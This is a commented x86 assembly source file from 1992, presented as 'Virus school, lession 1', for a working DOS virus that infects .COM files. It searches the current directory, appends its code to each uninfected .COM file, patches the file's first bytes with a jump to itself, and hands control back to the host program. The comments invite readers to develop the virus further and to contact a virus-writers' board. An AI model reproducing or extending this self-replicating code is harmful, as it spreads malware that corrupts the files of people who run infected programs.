;
;	Virus school, lession 1	 	(c) 1992 Tormentor [Demoralized Youth]
;
;	This is the first lession on how to make an own virus.
;	Hope you'll learn something of it...
;	To be compiled with TASM 3.0 or higher.
;
;	This virus is quite dumb and 'noisy' 
;	It updates the filedate and time, changes DTA before execution causing
;	some progs to belive they are executed with parameters...
;	But this should only be a 'raw' virus that you can develop.
;	Certain program may hang, so i recommend you not to spread to geeks
;	since there is MANY better viruses to use for such nice purpose.
;
;	If you want to conntact me or other virus-writers call me on my board:
;	Swedish Virus Laboratory	+46-3191-9393
;
;	Greetings to All virus-writers!
;	


		.model	tiny
		.radix	16
		.code
	
Virus_Lenght	EQU	Virus_End-Virus_Start	; Lenght of virus.

		org	100

dummy_code:	db	'M'		; Mark file as infected.
		db	3 DUP(90)	; This is to simulate a infected prog.
					; Not included in virus-code.

Virus_Start:	call	where_we_are	; Now we call the next bytes, just to
					; know what address virus lies on.
where_we_are:	pop	si		; Since the virus-code's address will
					; differ from victim to victim.
					; a POP SI after a call will give us the
					; address which equals to 'where_we_are'
					; Very important.

;-----------------------------------------------------------------------
; Now we have to put back the original 4 bytes in the host program, so 
; we can return control to it later:

		add	si,_4first_bytes-where_we_are
		mov	di,100
		cld
		movsw
		movsw

;------------------------------------------------------------------------

; We have to use SI as a reference since files differ in size thus making
; virus to be located at different addresses.

		sub	si,_4first_bytes-Virus_Start+4

;------------------------------------------------------------------------
; Now we just have to find victims, we will look for ALL .COM files in
; the current directory.
		
		mov	ah,4e		; We start to look for a *.COM file
look4victim:	mov	dx,offset file_match-Virus_Start
		add	dx,si
		int	21		

		jc	no_victim_found ; If no *.COM files was found.
		
		mov	ax,3d02		; Now we open the file.
		mov	dx,9e		; The found victims name is at ds:009e
		int	21		; in DTA.
		
		jc	cant_open_file	; If file couldn't be open.
		
		xchg	ax,bx		; Save filehandle in bx
; (we could use MOV BX,AX but we saves one byte by using xchg )
		
		mov	ah,3f		; Now we read the first 4 bytes
		mov	cx,4		; from the victim -> buffer

		mov	dx,offset _4first_bytes-Virus_Start
		add	dx,si
					; We will then overwrite them with
		int	21		; a JMP XXXX to virus-code at end.
		
		jc	read_error

		cmp	byte ptr ds:[si+_4first_bytes-Virus_Start],'M'
		jz	sick_or_EXE	; Check if infected OR *.EXE 
; Almost all EXE files starts with 'M' and we mark the infected files by
; starting with 'M' which equals to DEC BP 
; Now we just have to have one check instead of 2 (infected and *.EXE)

		mov	ax,4202		; Position file-pointer to point at 
		xor	cx,cx		; End-of-File.
		xor	dx,dx		; Any writing to file will now APPEND it
		int	21		; Returns AX -> at end.

		sub	ax,4		; Just for the JMP structure.

		mov	word ptr ds:[_4new_bytes+2],ax
					; Build new JMP XXXX to virus.
					; ( logic: JMP AX )
		
		mov	ah,40		; Append file with virus code.
		mov	cx,offset Virus_Lenght	
					; File-size will increase with 
		mov	dx,si		; Virus_Lenght.
		int	21		

		jc	write_error
	
		mov	ax,4200		; Position file-pointer to begin of file
		xor	cx,cx		; So we can change the first 3 bytes
		xor	dx,dx		; to JMP to virus.
		int	21		

		mov	ah,40		; Write new 3 bytes.
		mov	cx,4		; After this, executing the file will
		mov	dx,offset _4new_bytes-Virus_Start
		add	dx,si
					; result in virus-code executing before
		int	21		; original code.
					; (And more files will be infected)
		
		jc	write_error

		mov	ah,3e		; Close file, now file is infected.
		int	21		; Dos function 3E (close handle)

Sick_or_EXE:	mov	ah,4f		; Well, file is infected. Now let's
		jmp	look4victim	; find another victim...

write_error:		; Here you can test whats went wrong.
read_error:		; This is just for debugging purpose.
cant_open_file:		; These entries are equal to eachother
no_victim_found:	; but could be changed if you need to test something.
					
		mov	ax,100		; Every thing is put back in memory,
		push	ax		; lets us RET back to start of program
		ret			; and execute the original program.

notes		db	' (c) 1992 Tormentor ,Swedish Virus Laboratory'
		db	' / Demoralized Youth / '

file_match	db	'*.COM',0	; Pattern to search for.
					; Don't forget to end with 0 !

_4first_bytes:	ret			; Here we save the 4 first org. bytes
		db	3 DUP(0)	
; We have a ret here since this file isn't a REAL infection.

_4new_bytes	db	'M',0E9, 00, 00	; Here we build the 4 new org. bytes
					; so our virus-code will be run first.
Virus_End	EQU	$	

		end	dummy_code
